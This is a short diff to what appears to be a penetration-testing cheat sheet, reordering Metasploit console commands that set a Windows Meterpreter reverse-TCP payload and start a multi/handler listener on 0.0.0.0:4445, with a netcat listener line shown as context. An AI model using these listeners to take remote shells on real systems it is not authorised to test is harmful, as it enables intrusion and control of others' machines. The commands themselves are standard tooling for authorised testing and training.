@@ -421,10 +421,10 @@ rlwrap nc -nlvp 4444
 #### Meterpreter
 
 ```sh
-msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 > use exploit/multi/handler
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
 msf6 exploit(multi/handler) > set LHOST 0.0.0.0
 LHOST => 0.0.0.0
 msf6 exploit(multi/handler) > set LPORT 4445
